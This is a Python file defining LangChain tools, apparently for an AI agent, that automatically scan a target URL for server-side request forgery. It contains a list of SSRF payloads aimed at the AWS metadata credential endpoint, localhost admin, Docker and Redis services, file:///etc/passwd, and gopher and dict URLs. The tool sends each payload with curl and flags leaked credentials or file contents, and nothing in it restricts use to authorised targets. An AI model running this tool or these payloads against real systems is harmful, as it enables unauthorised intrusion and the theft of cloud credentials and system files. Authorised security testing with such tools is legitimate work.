"""
Server-Side Request Forgery (SSRF) Tester
Tests for SSRF vulnerabilities with various payloads and detection methods
"""

from langchain.tools import tool
import subprocess
import re
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


SSRF_PAYLOADS = {
    # Local network endpoints
    "localhost_http": "http://127.0.0.1:80",
    "localhost_admin": "http://localhost:8080",
    "localhost_admin_panel": "http://127.0.0.1:8080/admin",
    
    # AWS metadata
    "aws_metadata": "http://169.254.169.254/latest/meta-data/",
    "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    
    # Internal services
    "internal_api": "http://api.internal:8080/",
    "jenkins": "http://localhost:8080/",
    "docker": "http://localhost:2375/docker/info",
    "redis": "http://localhost:6379/",
    
    # File access
    "file_etc_passwd": "file:///etc/passwd",
    "file_windows_hosts": "file:///C:\\Windows\\System32\\drivers\\etc\\hosts",
    
    # Gopher protocol
    "gopher_redis": "gopher://localhost:6379/_PING",
    
    # Dict protocol
    "dict_service": "dict://localhost:11211/",
}


@tool
def test_ssrf_payloads(url: str, param_name: str = None) -> dict:
    """
    Test URL parameter for SSRF vulnerabilities
    
    Args:
        url: Target URL with parameter(s) to test
        param_name: Specific parameter name to test (if None, test all)
    
    Returns:
        Dictionary with SSRF findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "payloads_attempted": 0,
        "evidence": []
    }
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    
    if not params:
        findings["error"] = "No URL parameters found"
        return findings
    
    test_params = [param_name] if param_name else list(params.keys())
    
    for param in test_params:
        if param not in params:
            continue
            
        for payload_name, payload in SSRF_PAYLOADS.items():
            findings["payloads_attempted"] += 1
            
            # Replace parameter with SSRF payload
            test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params_dict[param] = payload
            
            # Reconstruct URL
            test_query = urlencode(test_params_dict)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
            
            try:
                result = subprocess.run(
                    ["curl", "-s", "-m", "5", "-v", test_url],
                    capture_output=True,
                    timeout=10,
                    text=True
                )
                
                # Check for indicators of successful SSRF
                response = result.stdout + result.stderr
                
                # AWS metadata indicators
                if "169.254.169.254" in test_url and ("AKIA" in response or "aws" in response.lower()):
                    findings["vulnerable"] = True
                    findings["findings"].append(f"AWS credential exposure via {payload_name}")
                    findings["evidence"].append({"payload": payload, "evidence": response[:200]})
                
                # Localhost/internal service indicators
                if "127.0.0.1" in test_url or "localhost" in test_url:
                    if any(indicator in response for indicator in ["<!DOCTYPE", "<html", "admin", "port", "Connected"]):
                        findings["vulnerable"] = True
                        findings["findings"].append(f"Internal service access via {payload_name}")
                        findings["evidence"].append({"payload": payload, "response_code": result.returncode})
                
                # File access indicators
                if "file://" in payload:
                    if "root:" in response or "Administrator" in response:
                        findings["vulnerable"] = True
                        findings["findings"].append(f"File access via {payload_name}")
                        findings["evidence"].append({"payload": payload, "evidence": response[:300]})
                
            except subprocess.TimeoutExpired:
                # Timeout might indicate connection to internal service
                findings["findings"].append(f"Timeout on {payload_name} (potential SSRF)")
            except Exception as e:
                pass
    
    return findings


@tool
def quick_ssrf_check(url: str) -> dict:
    """Quick SSRF vulnerability screening"""
    return test_ssrf_payloads(url, None)
